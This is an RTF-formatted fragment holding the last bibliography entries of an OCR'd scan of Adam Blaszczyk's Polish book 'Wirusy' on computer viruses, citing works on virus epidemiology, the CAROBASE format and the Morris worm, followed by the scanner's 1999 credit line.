\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 35. Epidemiology and Computer Viruses Alan, Solomon 1990.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 36. Viriology 101.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 37. Anthony Naggs CAROBASE Format Reference revised edition 1993.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\fi-282\li282\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 38. \tab Donn Seeley A Tour of the Worm Department of Computer Science, University of }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\fi-282\li282\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    Utah.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch --------------- info ------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch orginal book "Wirusy" by Adam Blaszczyk}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch scanned and ocr'ed by misha [cp'99]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch misha@vc.pl.             1999.06.08}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ---------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\par}}